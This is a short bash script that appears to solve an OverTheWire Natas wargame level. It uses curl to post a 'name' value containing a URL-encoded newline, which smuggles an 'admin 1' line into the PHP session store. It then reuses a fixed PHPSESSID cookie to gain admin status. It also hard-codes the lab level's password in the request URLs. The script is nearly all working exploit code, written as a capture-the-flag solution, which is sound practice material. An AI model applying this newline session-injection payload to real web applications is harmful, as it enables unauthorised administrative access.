#!/bin/bash

#. urlencode('\n') == '%0A
#. urlencode(' ') == '+'
DATA="name=hax%0Aadmin+1%0Afoo+bar"
COOKIE="PHPSESSID=admin"

curl http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org/index.php?debug=1 --data $DATA -b $COOKIE
curl http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org/index.php?debug=1 -b $COOKIE
